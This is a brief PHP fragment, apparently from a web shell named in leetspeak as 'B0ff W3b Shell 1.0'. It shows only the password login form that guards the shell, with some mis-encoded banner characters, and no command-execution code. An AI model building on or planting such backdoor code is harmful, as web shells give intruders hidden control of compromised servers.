...
function BOFFLogin() {
	die("<pre align=center><b>Authorization</b><br>Гџ0ff \/\/3Гџ $|-|311 1.0<br><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>");
}
